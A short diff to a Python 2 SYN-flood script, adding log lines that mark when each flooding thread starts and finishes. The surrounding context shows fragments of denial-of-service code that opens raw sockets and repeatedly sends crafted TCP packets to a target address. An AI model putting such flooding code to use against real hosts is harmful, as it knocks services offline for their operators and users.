@@ -16,6 +16,7 @@ def calcChecksum(header):
     return checksum
 
 def synFlood(ID, portDest, ipDest, event, queue):
+    print "SYN_FLOOD: Thread %s started" % (ID)
     while event.is_set():
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_RAW,\
@@ -65,5 +66,6 @@ def synFlood(ID, portDest, ipDest, event, queue):
         
         packet = ipv4Header + tcpHeader;
         s.sendto(packet, (ipDest, 0))
+    print "SYN_FLOOD: thread %s finished" % (ID)
     queue.task_done()
 
